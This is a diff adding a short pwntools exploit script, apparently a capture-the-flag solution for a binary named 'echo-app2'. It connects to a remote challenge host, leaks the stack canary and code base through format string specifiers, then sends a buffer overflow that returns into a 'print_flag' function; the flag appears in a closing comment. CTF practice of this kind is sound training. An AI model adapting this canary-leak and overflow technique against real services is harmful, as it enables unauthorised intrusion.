@@ -1,0 +1,29 @@
+from pwn import *
+
+# format string + bof
+
+p = remote("54.85.45.101", 8009)
+'''
+p = process("./echo-app2")
+gdb.attach(p, gdbscript = 
+b *do_echo + 372
+)
+'''
+e = ELF("./echo-app2")
+
+payload = b"%39$p"
+p.sendline(payload)
+canary = int(p.recv(0x12), 16)
+print(hex(canary))
+
+payload = b"%41$p"
+p.sendline(payload)
+code_base = int(p.recv(0x12), 16) - 0x15b5
+print(hex(code_base))
+win = code_base + e.symbols['print_flag']
+
+payload = b"A" * 0x108 + p64(canary) + p64(0) + p64(win)
+p.sendline(payload)
+
+p.interactive()
+#flag{aslr_and_canari3s_are_n0_match_f0r_l3aky_stacks}
